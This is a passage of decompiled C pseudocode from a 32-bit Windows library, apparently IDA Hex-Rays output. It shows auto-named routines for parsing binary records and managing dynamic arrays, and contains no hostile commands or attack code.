    *(_DWORD *)(*(_DWORD *)(this + 88) + 8),
    *(_DWORD *)(*(_DWORD *)(this + 100) + 8),
    *(_DWORD *)(*(_DWORD *)(this + 100) + 12),
    0);
  if ( **(_BYTE **)(this + 100) == 23 )
  {
    v5 = sub_1004C0E4((int)v14);
    v17 = v6;
  }
  else
  {
    v5 = (*(int (__thiscall **)(int *))(v14[0] + 56))(v14);
    v17 = 0;
  }
  v7 = v5;
  v8 = *(_DWORD *)(this + 88);
  v9 = *(_DWORD *)(this + 100);
  v10 = *(_DWORD *)(v9 + 24);
  v16 = *(_DWORD *)(v9 + 28);
  (*(void (__thiscall **)(_DWORD, int, int, _DWORD))(**(_DWORD **)(v8 + 8) + 68))(*(_DWORD *)(v8 + 8), v10, v16, 0);
  if ( (*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(this + 88) + 16))(*(_DWORD *)(this + 88), &v19) != 1
    || v19 == 2 )
  {
    goto LABEL_20;
  }
  *(_BYTE *)(this + 96) = v19;
  v11 = sub_1004B655((_DWORD *)this, __PAIR64__(v17, v7), v18);
  if ( v11 )
  {
    LOBYTE(v21) = 0;
    sub_10022419(v14);
    return v11;
  }
  else
  {
    v12 = (*(int (__thiscall **)(int, char *))(*(_DWORD *)this + 48))(this, v15);
    LOBYTE(v21) = 2;
    (*(void (__thiscall **)(int, int))(*(_DWORD *)(this + 36) + 56))(this + 36, v12);
    LOBYTE(v21) = 1;
    sub_1001584F((int)v15);
    LOBYTE(v21) = 0;
    sub_10022419(v14);
    return 0;
  }
}
// 1004B7F9: variable 'v4' is possibly undefined
// 1004B834: variable 'v6' is possibly undefined
// 1004B913: variable 'v13' is possibly undefined
// 1004B727: using guessed type char var_11[13];

//----- (1004B91A) --------------------------------------------------------
void *__thiscall sub_1004B91A(int this, void *a2, int a3)
{
  int v5; // edx
  void *v6; // edi
  int v7; // eax
  int v8; // edx
  LONG *v9; // eax
  int *v10; // ecx
  LONG *v11; // eax
  int v13; // [esp-34h] [ebp-FCh] BYREF
  int v14; // [esp-30h] [ebp-F8h] BYREF
  __int64 v15; // [esp-2Ch] [ebp-F4h]
  __int64 v16; // [esp-24h] [ebp-ECh]
  _DWORD v17[9]; // [esp+10h] [ebp-B8h] BYREF
  int v18[6]; // [esp+34h] [ebp-94h] BYREF
  char v19[16]; // [esp+4Ch] [ebp-7Ch] BYREF
  int v20[5]; // [esp+5Ch] [ebp-6Ch] BYREF
  int v21; // [esp+70h] [ebp-58h]
  unsigned __int64 v22; // [esp+74h] [ebp-54h]
  void *v23; // [esp+80h] [ebp-48h]
  int v24[5]; // [esp+84h] [ebp-44h] BYREF
  int v25[5]; // [esp+98h] [ebp-30h] BYREF
  unsigned int i; // [esp+ACh] [ebp-1Ch]
  int v27; // [esp+B0h] [ebp-18h]
  int v28; // [esp+C4h] [ebp-4h]
  unsigned int v29; // [esp+D4h] [ebp+Ch]

  v27 = 0;
  sub_1000B1F3(0, (int)v25, 0);
  v28 = 2;
  i = 0;
  memset(v18, 0, sizeof(v18));
  sub_100223C7(*(void **)(this + 88), (int)v19);
  LOBYTE(v28) = 3;
  (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(this + 88) + 8) + 68))(
    *(_DWORD *)(*(_DWORD *)(this + 88) + 8),
    *(_DWORD *)(a3 + 8),
    *(_DWORD *)(a3 + 12),
    0);
  if ( sub_10022497(v19) != 257 )
  {
    if ( sub_1004B684(this, a3, v25) )
    {
LABEL_19:
      LOBYTE(v28) = 2;
      sub_10022419(v19);
      v28 = 1;
      sub_1000B36F(v25, (int)a2);
      v27 |= 1u;
      goto LABEL_20;
    }
    v11 = (LONG *)sub_1000B1F3(0, (int)v24, 0);
    LOBYTE(v28) = 10;
    sub_1000B3BD(v11, (int)v25);
    LOBYTE(v28) = 3;
    v10 = v24;
LABEL_18:
    sub_1000B3DF(v10);
    goto LABEL_19;
  }
  if ( *(unsigned __int16 *)(a3 + 16) >= (unsigned __int64)(*(_QWORD *)(*(_DWORD *)(this + 100) + 56) + 8i64) )
  {
    sub_1000B1F3((void *)*(unsigned __int16 *)(a3 + 16), (int)v20, 0);
    LOBYTE(v28) = 4;
    (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(*(_DWORD *)(this + 88) + 8) + 68))(
      *(_DWORD *)(*(_DWORD *)(this + 88) + 8),
      *(_DWORD *)(a3 + 8),
      *(_DWORD *)(a3 + 12),
      0);
    if ( (*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(this + 88) + 12))(*(_DWORD *)(this + 88), v20) != *(unsigned __int16 *)(a3 + 16) )
      goto LABEL_6;
    v21 = (unsigned __int16)sub_1000B746(v20, 2);
    v23 = &v14;
    sub_1000B36F(v20, (int)&v14);
    LOBYTE(v28) = 4;
    LODWORD(v22) = sub_1004C108((void *)4, this, v14, v15, SHIDWORD(v15), v16, SHIDWORD(v16));
    HIDWORD(v22) = v5;
    v29 = (unsigned __int16)v21;
    v16 = (unsigned __int16)v21;
    v15 = *(_QWORD *)(*(_DWORD *)(this + 100) + 56);
    if ( *(unsigned __int16 *)(a3 + 16) < v15 * (unsigned __int64)(unsigned __int16)v21 + 8 )
    {
LABEL_6:
      sub_1000B36F(v25, (int)a2);
      v27 = 1;
      LOBYTE(v28) = 3;
      sub_1000B3DF(v20);
      goto LABEL_4;
    }
    sub_1001AC1E((int)v17);
    LOBYTE(v28) = 6;
    for ( i = 0; i < v29; ++i )
    {
      HIDWORD(v16) = v18;
      v6 = (void *)(i * *(_DWORD *)(*(_DWORD *)(this + 100) + 56) + 8);
      v23 = &v13;
      sub_1000B36F(v20, (int)&v13);
      LOBYTE(v28) = 6;
      v7 = sub_1004C108(v6, this, v13, v14, v15, SHIDWORD(v15), v16);
      if ( !sub_1004B47E((char *)this, v7, v8, (int *)HIDWORD(v16)) )
        break;
      sub_1000B1F3(0, (int)v24, 0);
      LOBYTE(v28) = 8;
      if ( !sub_1004B684(this, (int)v18, v24) || (unsigned int)(v24[3] + v20[3]) > v22 )
      {
        LOBYTE(v28) = 6;
        sub_1000B3DF(v24);
        break;
      }
      sub_1001AD28(v17, v24);
      LOBYTE(v28) = 6;
      sub_1000B3DF(v24);
    }
    v9 = (LONG *)sub_1001AD84(v17, (int)v24);
    LOBYTE(v28) = 9;
    sub_1000B3BD(v9, (int)v25);
    LOBYTE(v28) = 6;
    sub_1000B3DF(v24);
    sub_1001B4C9(v17);
    LOBYTE(v28) = 4;
    sub_1001AC89((int)v17);
    LOBYTE(v28) = 3;
    v10 = v20;
    goto LABEL_18;
  }
  sub_1000B36F(v25, (int)a2);
  v27 = 1;
LABEL_4:
  LOBYTE(v28) = 2;
  sub_10022419(v19);
LABEL_20:
  LOBYTE(v28) = 0;
  sub_1000B3DF(v25);
  return a2;
}
// 1004BA75: variable 'v5' is possibly undefined
// 1004BB04: variable 'v8' is possibly undefined
// 1004B91A: using guessed type int var_30[5];
// 1004B91A: using guessed type _DWORD var_B8[9];

//----- (1004BC40) --------------------------------------------------------
void __thiscall sub_1004BC40(int *this, int a2, int a3)
{
  int v3; // edi
  int v4; // esi
  __int64 v5; // rcx
  unsigned __int16 v6; // ax
  __int64 v7; // rax
  int v8; // esi
  int v9; // edx
  int v10; // edx
  int v11; // esi
  int v12; // edx
  LONG *v13; // edi
  int v14; // eax
  int v15; // [esp-24h] [ebp-A4h] BYREF
  __int64 v16; // [esp-20h] [ebp-A0h]
  __int64 v17; // [esp-18h] [ebp-98h]
  __int64 v18; // [esp-10h] [ebp-90h]
  __int64 v19; // [esp-8h] [ebp-88h]
  int v20[6]; // [esp+10h] [ebp-70h] BYREF
  int v21; // [esp+28h] [ebp-58h] BYREF
  int v22; // [esp+2Ch] [ebp-54h] BYREF
  int v23; // [esp+30h] [ebp-50h]
  int v24; // [esp+34h] [ebp-4Ch]
  int v25; // [esp+38h] [ebp-48h]
  int v26; // [esp+3Ch] [ebp-44h]
  int v27[5]; // [esp+44h] [ebp-3Ch] BYREF
  unsigned int v28; // [esp+58h] [ebp-28h]
  void *v29; // [esp+5Ch] [ebp-24h]
  int v30; // [esp+64h] [ebp-1Ch]
  unsigned int v31; // [esp+68h] [ebp-18h]
  unsigned int v32; // [esp+6Ch] [ebp-14h]
  int v33; // [esp+7Ch] [ebp-4h]

  v33 = 0;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v32 = 0;
  v3 = a2;
  if ( sub_1004B47E((char *)a2, this[4], this[5], &v21) )
  {
    v4 = (unsigned __int16)v25;
    v19 = 4i64;
    v18 = *(_QWORD *)(*(_DWORD *)(a2 + 100) + 56);
    v28 = 4 * v18;
    if ( is_mul_ok(4u, v18) && (unsigned __int16)v25 >= v28 )
    {
      sub_1000B1F3((void *)(unsigned __int16)v25, (int)v27, 0);
      LOBYTE(v33) = 1;
      v5 = *(unsigned int *)(*(_DWORD *)(a2 + 88) + 8);
      (*(void (__cdecl **)(int, int, _DWORD))(*(_DWORD *)v5 + 68))(v23, v24, 0);
      if ( (*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a2 + 88) + 12))(*(_DWORD *)(a2 + 88), v27) == v4
        && sub_1000B746(v27, SHIDWORD(v5)) == 2
        && (v6 = sub_1000B746(v27, 2),
            v31 = v6,
            v7 = 3i64 * v6,
            LODWORD(v5) = v7,
            v17 = *(_QWORD *)(*(_DWORD *)(a2 + 100) + 56),
            v16 = __PAIR64__(HIDWORD(v7), 1) + v5,
            (__PAIR64__(HIDWORD(v7), 1) + v5) * v17 == v27[3]) )
      {
        v32 = 0;
        while ( v32 < v31 )
        {
          v8 = 3 * v32;
          v30 = *(_DWORD *)(*(_DWORD *)(v3 + 100) + 56) * (3 * v32 + 1);
          v29 = &v15;
          sub_1000B36F(v27, (int)&v15);
          LOBYTE(v33) = 1;
          v20[0] = sub_1004C108((void *)v30, v3, v15, v16, SHIDWORD(v16), v17, SHIDWORD(v17));
          v20[1] = v9;
          v30 = *(_DWORD *)(*(_DWORD *)(v3 + 100) + 56) * (v8 + 2);
          v29 = &v15;
          sub_1000B36F(v27, (int)&v15);
          LOBYTE(v33) = 1;
          v20[2] = sub_1004C108((void *)v30, v3, v15, v16, SHIDWORD(v16), v17, SHIDWORD(v17));
          v20[3] = v10;
          v11 = *(_DWORD *)(*(_DWORD *)(v3 + 100) + 56) * (v8 + 3);
          v29 = &v15;
          sub_1000B36F(v27, (int)&v15);
          LOBYTE(v33) = 1;
          v20[4] = sub_1004C108((void *)v11, v3, v15, v16, SHIDWORD(v16), v17, SHIDWORD(v17));
          v20[5] = v12;
          v13 = (LONG *)sub_1000B1F3((void *)0x18, (int)&v22, v20);
          LOBYTE(v33) = 5;
          v14 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)a3 + 16))(a3, v20);
          sub_1000B3BD(v13, v14);
          LOBYTE(v33) = 1;
          sub_1000B3DF(&v22);
          ++v32;
          v3 = a2;
        }
        LOBYTE(v33) = 0;
        sub_1000B3DF(v27);
      }
      else
      {
        LOBYTE(v33) = 0;
        sub_1000B3DF(v27);
      }
    }
  }
}
// 1004BC9B: conditional instruction was optimized away because esi.4<10000u
// 1004BD73: variable 'v9' is possibly undefined
// 1004BDA5: variable 'v10' is possibly undefined
// 1004BDD3: variable 'v12' is possibly undefined

//----- (1004BE36) --------------------------------------------------------
char __thiscall sub_1004BE36(int *this, int *a2, int *a3)
{
  unsigned int v4; // edi
  int v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  int v8; // edx
  int v9; // eax
  unsigned int v10; // eax
  void *v11; // edi
  int v12; // edi
  int v13; // edx
  int v14; // edi
  int v15; // edx
  int v16; // edx
  unsigned int v17; // ecx
  int v19; // [esp-14h] [ebp-74h] BYREF
  __int64 v20; // [esp-10h] [ebp-70h]
  __int64 v21; // [esp-8h] [ebp-68h]
  int v22[8]; // [esp+10h] [ebp-50h] BYREF
  int v23[5]; // [esp+34h] [ebp-2Ch] BYREF
  void *v24; // [esp+48h] [ebp-18h]
  void *v25; // [esp+4Ch] [ebp-14h]
  unsigned int v26; // [esp+50h] [ebp-10h]
  int v27; // [esp+5Ch] [ebp-4h]

  memset(v22, 0, sizeof(v22));
  v5 = *this;
  v26 = *a2;
  v4 = v26;
  if ( v4 >= (*(int (__thiscall **)(int *))(v5 + 4))(this) )
    return 0;
  while ( 1 )
  {
    v6 = (_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(this[9] + 44))(this + 9, v26);
    sub_1004B599(this, v23, *v6, v6[1]);
    v27 = 0;
    v7 = this[25];
    v21 = 4i64;
    v20 = *(_QWORD *)(v7 + 56);
    if ( 4 * v20 == v23[3] )
    {
      v25 = 0;
      v24 = &v19;
      sub_1000B36F(v23, (int)&v19);
      LOBYTE(v27) = 0;
      v22[0] = sub_1004C108(v25, (int)this, v19, v20, SHIDWORD(v20), v21, SHIDWORD(v21));
      v22[1] = v8;
      if ( (v22[0] & 0x1F) == 4 )
        break;
    }
    v27 = -1;
    sub_1000B3DF(v23);
    v9 = *this;
    ++v26;
    v10 = (*(int (__thiscall **)(int *))(v9 + 4))(this);
    if ( v26 >= v10 )
      return 0;
  }
  v11 = *(void **)(this[25] + 56);
  v24 = &v19;
  sub_1000B36F(v23, (int)&v19);
  LOBYTE(v27) = 0;
  v22[2] = sub_1004C108(v11, (int)this, v19, v20, SHIDWORD(v20), v21, SHIDWORD(v21));
  v12 = *(_DWORD *)(this[25] + 56);
  v24 = &v19;
  v22[3] = v13;
  sub_1000B36F(v23, (int)&v19);
  LOBYTE(v27) = 0;
  v22[4] = sub_1004C108((void *)(2 * v12), (int)this, v19, v20, SHIDWORD(v20), v21, SHIDWORD(v21));
  v14 = 3 * *(_DWORD *)(this[25] + 56);
  v24 = &v19;
  v22[5] = v15;
  sub_1000B36F(v23, (int)&v19);
  LOBYTE(v27) = 0;
  v22[6] = sub_1004C108((void *)v14, (int)this, v19, v20, SHIDWORD(v20), v21, SHIDWORD(v21));
  v22[7] = v16;
  qmemcpy(a3, v22, 0x20u);
  v17 = v26;
  a2[1] = 0;
  *a2 = v17;
  v27 = -1;
  sub_1000B3DF(v23);
  return 1;
}
// 1004BEDC: variable 'v8' is possibly undefined
// 1004BF47: variable 'v13' is possibly undefined
// 1004BF76: variable 'v15' is possibly undefined
// 1004BF9D: variable 'v16' is possibly undefined

//----- (1004BFBD) --------------------------------------------------------
char __usercall sub_1004BFBD@<al>(int a1@<ecx>, _DWORD *a2@<edi>, int *a3@<esi>)
{
  _DWORD *v3; // ebx
  char result; // al
  int v5; // eax
  char v6; // bl
  int v7; // edx
  int v8; // edx
  int v9; // edx
  int v10; // edx
  int v11; // [esp-14h] [ebp-4Ch] BYREF
  __int64 v12; // [esp-10h] [ebp-48h]
  __int64 v13; // [esp-8h] [ebp-40h]
  int v14[5]; // [esp+10h] [ebp-28h] BYREF
  void *v15; // [esp+24h] [ebp-14h]
  int v16; // [esp+28h] [ebp-10h]
  int v17; // [esp+34h] [ebp-4h]

  v3 = (_DWORD *)(a1 + 24);
  result = (*(int (__thiscall **)(_DWORD *, int))(*a2 + 8))(a2, a1 + 24);
  if ( result )
  {
    sub_1004B599(a2, v14, *v3, v3[1]);
    v17 = 0;
    v5 = a2[25];
    v13 = 4i64;
    v12 = *(_QWORD *)(v5 + 56);
    if ( 4 * v12 == v14[3] )
    {
      v16 = 0;
      v15 = &v11;
      sub_1000B36F(v14, (int)&v11);
      LOBYTE(v17) = 0;
      *a3 = sub_1004C108((void *)v16, (int)a2, v11, v12, SHIDWORD(v12), v13, SHIDWORD(v13));
      a3[1] = v7;
      v16 = *(_DWORD *)(a2[25] + 56);
      v15 = &v11;
      sub_1000B36F(v14, (int)&v11);
      LOBYTE(v17) = 0;
      a3[2] = sub_1004C108((void *)v16, (int)a2, v11, v12, SHIDWORD(v12), v13, SHIDWORD(v13));
      a3[3] = v8;
      v16 = 2 * *(_DWORD *)(a2[25] + 56);
      v15 = &v11;
      sub_1000B36F(v14, (int)&v11);
      LOBYTE(v17) = 0;
      a3[4] = sub_1004C108((void *)v16, (int)a2, v11, v12, SHIDWORD(v12), v13, SHIDWORD(v13));
      a3[5] = v9;
      v16 = 3 * *(_DWORD *)(a2[25] + 56);
      v15 = &v11;
      sub_1000B36F(v14, (int)&v11);
      LOBYTE(v17) = 0;
      a3[6] = sub_1004C108((void *)v16, (int)a2, v11, v12, SHIDWORD(v12), v13, SHIDWORD(v13));
      a3[7] = v10;
      v6 = 1;
    }
    else
    {
      v6 = 0;
    }
    v17 = -1;
    sub_1000B3DF(v14);
    return v6;
  }
  return result;
}
// 1004C04B: variable 'v7' is possibly undefined
// 1004C079: variable 'v8' is possibly undefined
// 1004C0A9: variable 'v9' is possibly undefined
// 1004C0DA: variable 'v10' is possibly undefined

//----- (1004C0E4) --------------------------------------------------------
int __usercall sub_1004C0E4@<eax>(int a1@<esi>)
{
  int v1; // edi

  v1 = (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 56))(a1);
  (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 56))(a1);
  return v1;
}

//----- (1004C108) --------------------------------------------------------
int __thiscall sub_1004C108(void *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // edi
  int v9; // esi

  if ( **(_BYTE **)(a2 + 100) == 23 )
  {
    v8 = sub_1000B6F2(&a3, (int)this);
    sub_1000B6F2(&a3, (int)this + 4);
    v9 = v8;
  }
  else
  {
    v9 = sub_1000B6F2(&a3, (int)this);
  }
  sub_1000B3DF(&a3);
  return v9;
}

//----- (1004C16D) --------------------------------------------------------
int __thiscall sub_1004C16D(int this, int a2)
{
  sub_1003DCC0((void *)(this + 4), a2);
  return a2;
}

//----- (1004C19E) --------------------------------------------------------
_DWORD *__thiscall sub_1004C19E(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x30u);
  if ( v3 )
  {
    v3[1] = this;
    *v3 = &off_1010425C;
    v3[2] = off_10103CC0;
    v3[10] = 0;
    v4 = v3;
  }
  else
  {
    v4 = 0;
  }
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}
// 10103CC0: using guessed type int (__thiscall *off_10103CC0[2])(void *Block, char);
// 1010425C: using guessed type int (__stdcall *off_1010425C)(char);

//----- (1004C223) --------------------------------------------------------
BOOL __thiscall sub_1004C223(int this)
{
  return *(_DWORD *)(this + 40) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1004C240) --------------------------------------------------------
_DWORD *__thiscall sub_1004C240(_DWORD *this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  int v5; // [esp-4h] [ebp-10h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[10]);
  v5 = this[10];
  this[4] = *v2;
  this[5] = v2[1];
  v3 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, v5);
  this[6] = *v3;
  this[7] = v3[1];
  this[8] = v3[2];
  this[9] = v3[3];
  return this + 2;
}

//----- (1004C27C) --------------------------------------------------------
void __thiscall sub_1004C27C(_DWORD *this)
{
  --this[10];
}

//----- (1004C287) --------------------------------------------------------
void __thiscall sub_1004C287(int this)
{
  *(_DWORD *)this = &off_10104200;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_10039F05((_DWORD *)this);
}
// 10104200: using guessed type int (__thiscall *off_10104200)(void *Block, char);

//----- (1004C2D6) --------------------------------------------------------
unsigned int __thiscall sub_1004C2D6(_DWORD *this, int *a2, unsigned int a3)
{
  int v4; // esi
  int v5; // eax
  unsigned int result; // eax
  int v7; // ecx
  int v8; // edx
  _DWORD *v9; // esi
  _DWORD *v10; // edi
  _DWORD *v11; // edi
  int v12; // [esp+Ch] [ebp-10h]
  int v13; // [esp+10h] [ebp-Ch]
  int v14; // [esp+14h] [ebp-8h]
  int v15; // [esp+18h] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1013093F);
  v12 = *a2;
  v13 = a2[1];
  v14 = a2[2];
  v15 = a2[3];
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result > a3 )
  {
    v7 = 16 * result;
    result -= a3;
    do
    {
      v8 = this[3];
      v9 = (_DWORD *)(v7 + v8 - 16);
      *(_DWORD *)(v7 + v8) = *v9++;
      *(_DWORD *)(v7 + v8 + 4) = *v9++;
      *(_DWORD *)(v7 + v8 + 8) = *v9;
      v10 = (_DWORD *)(v7 + v8 + 12);
      v7 -= 16;
      --result;
      *v10 = v9[1];
    }
    while ( result );
  }
  v11 = (_DWORD *)(this[3] + 16 * a3);
  *v11++ = v12;
  *v11++ = v13;
  *v11 = v14;
  v11[1] = v15;
  ++this[1];
  return result;
}

//----- (1004C353) --------------------------------------------------------
int __thiscall sub_1004C353(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  int v4; // ebp
  int v5; // eax
  _DWORD *v6; // edi

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10130942);
  v3 = *this;
  --this[1];
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v4 = 16 * a2;
    do
    {
      v5 = this[3];
      ++a2;
      *(_DWORD *)(v5 + v4) = *(_DWORD *)(v5 + v4 + 16);
      *(_DWORD *)(v5 + v4 + 4) = *(_DWORD *)(v5 + v4 + 20);
      *(_DWORD *)(v5 + v4 + 8) = *(_DWORD *)(v5 + v4 + 24);
      *(_DWORD *)(v5 + v4 + 12) = *(_DWORD *)(v5 + v4 + 28);
      v4 += 16;
    }
    while ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v6 = (_DWORD *)(this[3] + 16 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
  *v6++ = dword_10193BC8[0];
  *v6++ = dword_10193BC8[1];
  *v6 = dword_10193BC8[2];
  v6[1] = dword_10193BC8[3];
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193BC8: using guessed type _DWORD dword_10193BC8[4];

//----- (1004C3C6) --------------------------------------------------------
int __thiscall sub_1004C3C6(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10130943);
  return this[3] + 16 * a2;
}

//----- (1004C3E5) --------------------------------------------------------
int __thiscall sub_1004C3E5(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10130946);
  return this[3] + 16 * a2;
}

//----- (1004C404) --------------------------------------------------------
int __thiscall sub_1004C404(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebp
  int v4; // ebp
  _DWORD *v5; // edi
  int v6; // eax
  unsigned int v8; // [esp+8h] [ebp-4h]

  v2 = a2;
  v8 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 16 * a2;
    do
    {
      v5 = (_DWORD *)(v4 + this[3]);
      ++v8;
      *v5++ = dword_10193BC8[0];
      *v5++ = dword_10193BC8[1];
      *v5 = dword_10193BC8[2];
      v5[1] = dword_10193BC8[3];
      v4 += 16;
    }
    while ( v8 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    v2 = a2;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v6 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v6 + 88))(this);
}
// 10193BC8: using guessed type _DWORD dword_10193BC8[4];

//----- (1004C45F) --------------------------------------------------------
unsigned int __thiscall sub_1004C45F(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10130947);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 16;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1004C4DB) --------------------------------------------------------
unsigned int __thiscall sub_1004C4DB(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // esi
  unsigned int result; // eax
  int v8; // ecx
  _DWORD *v9; // edi
  unsigned int v10; // [esp+10h] [ebp+8h]
  int v11; // [esp+18h] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(16 * v5);
  v10 = 0;
  this[1] = a2;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v11 = 0;
    do
    {
      v8 = v11;
      v11 += 16;
      v9 = (_DWORD *)(v8 + this[3]);
      ++v10;
      *v9++ = *(_DWORD *)(v8 + a3);
      *v9++ = *(_DWORD *)(v8 + a3 + 4);
      *v9 = *(_DWORD *)(v8 + a3 + 8);
      v9[1] = *(_DWORD *)(v8 + a3 + 12);
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (1004C550) --------------------------------------------------------
void __thiscall sub_1004C550(_DWORD *this)
{
  int v2; // esi
  int v3; // eax
  int v4; // esi
  int v5; // eax
  _BYTE *v6; // esi
  int v7; // eax
  _DWORD *v8; // ecx
  _BYTE *Block; // [esp+10h] [ebp-10h]
  int v10; // [esp+14h] [ebp-Ch]
  unsigned int v11; // [esp+18h] [ebp-8h]
  _DWORD *v12; // [esp+1Ch] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v10 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v10 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    Block = (_BYTE *)this[3];
    v11 = 0;
    v6 = operator new(16 * v10);
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v7 = Block - v6;
      v12 = v6;
      while ( 1 )
      {
        v8 = v12;
        ++v11;
        v12 += 4;
        *v8 = *(_DWORD *)((char *)v8 + v7);
        v8[1] = *(_DWORD *)((char *)v8 + v7 + 4);
        v8[2] = *(_DWORD *)((char *)v8 + v7 + 8);
        v8[3] = *(_DWORD *)((char *)v8 + v7 + 12);
        if ( v11 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
        v7 = Block - v6;
      }
    }
    this[3] = v6;
    j__free(Block);
    this[2] = v10;
  }
}

//----- (1004C619) --------------------------------------------------------
_DWORD *__stdcall sub_1004C619(_DWORD *a1)
{
  unsigned int i; // eax

  *a1 = off_100FBF5C;
  *a1 = &off_101041C4;
  sub_1003EEF5(a1 + 1);
  a1[5] = off_100FBF5C;
  a1[5] = &off_10104200;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  a1[6] = 0;
  a1[7] = i;
  a1[8] = operator new(16 * i);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101041C4: using guessed type int (__thiscall *off_101041C4)(void *Block, char);
// 10104200: using guessed type int (__thiscall *off_10104200)(void *Block, char);

//----- (1004C692) --------------------------------------------------------
void __thiscall sub_1004C692(_DWORD *this)
{
  *this = &off_101041C4;
  sub_1004C287((int)(this + 5));
  sub_1001584F((int)(this + 1));
  sub_10039F05(this);
}
// 101041C4: using guessed type int (__thiscall *off_101041C4)(void *Block, char);

//----- (1004C6D5) --------------------------------------------------------
int __thiscall sub_1004C6D5(_DWORD *this, _DWORD *a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  char v6[16]; // [esp+Ch] [ebp-10h] BYREF

  v3 = sub_1003F03E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), *v4 != *a2)
    || v4[1] != a2[1] )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, a2, v3);
